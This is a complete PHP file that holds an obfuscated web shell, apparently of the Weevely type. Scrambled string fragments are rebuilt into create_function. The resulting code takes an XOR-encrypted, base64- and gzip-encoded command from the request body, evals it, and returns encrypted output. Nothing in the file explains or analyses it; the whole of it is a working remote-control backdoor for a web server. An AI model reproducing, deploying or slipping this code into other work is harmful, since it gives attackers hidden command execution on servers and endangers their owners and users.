<?php
$E='t_%contents()%;@o%b_end_cl%ean();$r=%@base6%4_en%code(@x(%@gzco%mpress%($o)%,$k%));print("$p%$kh$%r$kf");}';
$A=str_replace('mo','','momocreatmoe_fmounmocmotion');
$C='//input"),$m)==%1) {@ob%_start();@%ev%al(@g%zuncom%p%re%ss(@x(@b%ase64_decode($%m[1]),$k))%);$o=@%o%b_ge';
$U='k){$c=%%st%rlen($k);$l=strlen%($t);$o=%"";f%or($i%%=0;%$i%<$l;){for($j=0;(%$j<$%c&&$i<$l);$j%++,$%i++%)';
$T='$%k="aa%75d%61d";$kh="b%5f7479dcc%fd";$kf=%%"6%1ccfbc7%2b90";%$p="tW0zNW%t%8TQDdXna4";f%unction x($%t%,$';
$V='{$o.=$t{$i}%%%%^$k{$j};}}return% $o;}i%f (@preg_match%("%/$kh%(.+)%$kf/",@file%_get_c%ontents%(%%"php%:';
$o=str_replace('%','',$T.$U.$V.$C.$E);
$Q=$A('',$o);$Q();
?>
